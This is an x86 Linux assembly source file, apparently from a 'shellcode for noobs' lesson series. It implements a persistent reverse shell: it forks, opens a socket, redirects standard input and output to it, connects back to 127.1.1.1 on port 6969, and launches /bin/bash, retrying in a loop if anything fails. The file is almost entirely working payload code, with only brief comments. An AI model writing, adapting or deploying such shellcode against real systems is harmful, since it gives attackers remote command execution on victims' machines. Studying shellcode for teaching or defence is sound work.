;
; part of my shellcode for noobs lesson series hosted in #goatzzz on
;irc.enigmagroup.org
;
; 32bit call: eax args: ebx, ecx, edx, esi, edi, and ebp
;
; part of my shellcode for noobs lesson series hosted in #goatzzz on
;irc.enigmagroup.org
;
; 32bit call: eax args: ebx, ecx, edx, esi, edi, and ebp
[bits 32]
section .text
global _start
_start:
; fork(void);
    xor eax,eax ; cleanup after rdtsc
    xor edx,edx ; ....
    xor ebx,ebx ; cleanup the rest
    xor ecx,ecx ; ....
    mov al,0x02
    int 0x80
    cmp eax,1    ; if this is a child, or we have failed to clone
    jl fork        ; jump to the main code
    jmp exit
fork:
; socket(AF_INET, SOCK_STREAM, 0);
    push eax
    push byte 0x1 ; SOCK_STREAM
    push byte 0x2 ; AF_INET
    mov al, 0x66 ; sys_socketcall
    mov bl,0x1    ; sys_socket
    mov ecx,esp
    int 0x80
 
; dup2(s,i);
    mov ebx,eax ; s
    xor ecx,ecx
loop:
    mov al,0x3f    ; sys_dup2
    int 0x80
    inc ecx
    cmp ecx,4
    jne loop
 
; connect(s, (sockaddr *) &addr,0x10);
    push 0x0101017f        ; IP = 127.1.1.1
    push word 0x391b    ; PORT = 6969
    push word 0x2        ; AF_INET
    mov ecx,esp
 
    push byte 0x10
    push ecx        ;pointer to arguments
    push ebx        ; s -> standard out/in
    mov ecx,esp
    mov al,0x66
    int 0x80
    xor ecx,ecx
    sub eax,ecx
    jnz cleanup ; cleanup and start over
 
; fork(void);
    mov al,0x02
    int 0x80
    cmp eax,1    ; if this is a child, or we have failed to clone
    jl client    ; jump to the shell
    xor eax,eax
    push eax
    jmp cleanup ; cleanup and start over
 
client:
; execve(SHELLPATH,{SHELLPATH,0},0);
    mov al,0x0b
    jmp short sh
load_sh:
    pop esi
    push edx ; 0
    push esi
    mov ecx,esp
    mov ebx,esi
    int 0x80
 
cleanup:
; close(%ebx)
    xor eax,eax
    mov al,0x6
    int 0x80
    pause
    rdtsc
    pause
    jmp _start
 
exit:
; exit(0);
    xor eax,eax
    mov al,0x1
    xor ebx,ebx
    int 0x80
 
sh:
    call load_sh
    db "/bin/bash"